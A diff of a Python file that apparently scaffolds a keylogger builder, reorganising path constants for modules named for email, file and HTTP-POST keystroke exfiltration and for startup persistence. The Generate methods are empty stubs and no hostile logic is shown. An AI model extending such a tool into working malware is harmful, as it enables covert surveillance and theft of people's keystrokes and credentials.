@@ -85,11 +85,27 @@ class Cipher:
                 decrypted += str(c)
         return decrypted
 
-class Generate:
-    class FileNames:
+class FileNames:
+    base = os.getcwd()
+    modules = os.path.join(base, "modules")
+    _1_imports = os.path.join(modules, "1.imports.py") 
+    _2_cipher = os.path.join(modules, "2.cipher.py")
+    class _3:
         base = os.getcwd()
         modules = os.path.join(base, "modules")
-        _1_imports = os.path.join(modules, "1.imports.py") 
+        email = os.path.join(modules, "3.keylogger.email.py") 
+        file = os.path.join(modules, "3.keylogger.file.py") 
+        post = os.path.join(modules, "3.keylogger.post.py") 
+    _4_cipher = os.path.join(modules, "2.startup.py")
+    class _5:
+        base = os.getcwd()
+        modules = os.path.join(base, "modules")
+        email = os.path.join(modules, "5.keylogger.email.py") 
+        file = os.path.join(modules, "5.keylogger.file.py") 
+        post = os.path.join(modules, "5.keylogger.post.py") 
+        
+class Generate:
+    
         
     def __init__(self) -> None:
         pass
@@ -97,4 +113,3 @@ class Generate:
     def loadModules(self):
         pass
 
-print(Cipher.decrypt(ciphertext=b'T1IzWE01RFhPUjNITzVEV081MkhNNTNXT1FGQVU2RFpOQlZXUzZEUkJJPT09PT09', key=16))
